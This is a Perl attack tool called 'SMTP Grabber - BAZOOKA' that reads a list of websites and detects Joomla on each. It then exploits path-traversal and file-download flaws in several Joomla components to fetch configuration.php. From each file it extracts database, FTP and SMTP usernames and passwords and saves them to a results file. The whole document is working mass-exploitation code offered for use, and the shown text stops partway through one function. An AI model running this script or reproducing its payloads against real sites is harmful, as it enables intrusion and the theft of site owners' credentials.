#!/usr/bin/perl
#Coded By Wissem Mahfoud.
#RECORDED? Only Changed And Delete COPYRIGHT? Don't Be A Bastard Dude! if u change or edit it u are fucking idiot and kids.
#I'am a creative genius.
use if $^O eq "MSWin32",Win32::Console::ANSI;
use Digest::MD5 qw(md5 md5_hex md5_base64);
use WWW::Mechanize;
use Getopt::Long;
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Cookies;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use MIME::Base64;
use URI::URL;
use IO::Socket::INET;
use threads;
use threads::shared;
use Thread qw(:DEFAULT async yield);
my $now_string = localtime();
@months = qw(01 02 03 04 05 06 07 08 09 10 11 12);
($second, $minute, $hour, $dayOfMonth, $month, $yearOffset, $dayOfWeek, $dayOfYear, $daylightSavings) = localtime();
$year = 1900 + $yearOffset;
$month = "$months[$month]";

sub banner() {
system("title SMTP Grabber - BAZOOKA V1.5");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('red');
$logo="
              _________
            /'        /|
           /         / |_
          /         /  //|
         /_________/  ////|
        |   _ _    | 8o////|
        | /'// )_  |   8///|
        |/ // // ) |   8o///|
        / // // //,|  /  8//|
       / // // /// | /   8//|  DAWN THEM NOW ! BY BAZOOKA
      / // // ///__|/    8//|  Time & Date : $now_string
     /.(_)// /// |       8///|
    (_)' `(_)//| |       8////|___________
   (_) /_\ (_)'| |        8///////////////
   (_) \"/ (_)'|_|         8/////////////
    (_)._.(_) d' Hb         8oooooooopb'
      `(_)'  d'  H`b
            d'   `b`b
           d'     H `b
          d'      `b `b
         d'           `b
        d'             `b                     
";
print $logo;
print "\n";
print colored ("                          Type: SMTP GRABBER & CRACKER \n",'green');
print colored ("                          Author: Wissem Mahfoud\n",'cyan');
print color 'reset';
}
banner();
GetOptions(
    "l|list=s" => \$list,
);

unless ($list) { help(); }
sub help {
print color("green"), "\n";
print color("green"),"./Select: \n\n";
print color 'reset';
print color("white on_red"),"[1]";
print color 'reset';
print color 'reset';
print color("yellow")," Press 1 To Continue\n";
print color 'reset';
print color 'reset';
$number=<STDIN>;
chomp $number;}
if($number eq '1')
{

print color("bold white on_red")," WELCOME TO HELL ENTER LIST OF WEBSITES: ";
print color 'reset';
$list=<STDIN>;
chomp $list;
}
$tmp="tmp";
    if (-e $tmp) 
    {
    }
    else
    {
        mkdir $tmp or die "Error creating directory: $tmp";
    }

$rez="Result";
    if (-e $rez) 
    {
    }
    else
    {
        mkdir $rez or die "Error creating directory: $rez";
    }

$a = 0;
open (THETARGET, "$list") || die "[-] Can't open the list websites file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;
banner();
print "\n";
print color("yellow"), "(+) Found Total websites : ";
print color("red"), "".scalar(@TARGETS)."\n\n";
print color('reset');

OUTER: foreach $site(@TARGETS){
chomp($site);
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
$a++;
cms();
}

################ CMS DETCTER #####################
sub cms{
# Get the thread id. Allows each thread to be identified.
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (5);
my $cms = $ua->get("$site")->content;

if($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print color('bold white'),"[$a]";
print color('reset');
print color('bold white')," $site";
print color('reset');
print color('bold white')," ====> ";
print color('reset');
print color("green"), "Joomla\n";
print color('reset');
hdflvplayer();
comcckjseblod();
comjoomanager();
comaceftp();
comjtagmembersdirectory();
commacgallery();
commacgallery();
s5mediaplayer(); 
comdocman();
moddvfoldercontent();
comaddproperty();
comcontushdvideoshare();
comjetext();
comproductmodule(); 
wddownload();               
jat3action();
comcommunity();
downloadmonitor();
jat3action2();
}
else{
print color('bold white'),"[$a]";
print color('reset');
print color('bold white')," $site";
print color('reset');
print color('bold white')," ====> ";
print color('reset');
print color("green"),"Unknown\n"; 
print color('reset'); 
}
}


####################################################################################################
######################################COM hdflvplayer##############################################
####################################################################################################
sub hdflvplayer(){
$conflink = "$site/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 1";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[hdflv] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 1";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_cckjseblod##############################################
####################################################################################################
sub comcckjseblod(){
$conflink = "$site/index.php?option=com_cckjseblod&task=download&file=configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 2";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[comcckjseblod] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 2";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_joomanager##############################################
####################################################################################################
sub comjoomanager(){
$conflink = "$site/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 3";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[com_joomanager] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 3";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_aceftp##############################################
####################################################################################################
sub comaceftp(){
$conflink = "$site/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 4";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[com_aceftp] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 4";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_jtagmembersdirectory##############################################
####################################################################################################
sub comjtagmembersdirectory(){
$conflink = "$site/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 5";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[com_jtagmembersdirectory] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
print color('bold white on_red'),"SMTP GRABBER 5";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('red');
print "Failed";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}
####################################################################################################
######################################com_macgallery##############################################
####################################################################################################
sub commacgallery(){
$conflink = "$site/index.php?option=com_macgallery&view=download&albumid=../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){;
print color('bold white on_red'),"SMTP GRABBER 6";
print color('reset');
print color('bold white')," ................... ";
print color('reset');
print color('green');
print "Done";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[com_macgallery] $site\n";   
    close(save);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}
        if ($cont =~ /smtpsecure = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Secure = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Secure = $1\n";
        close (TEXT);
  
}

}else{
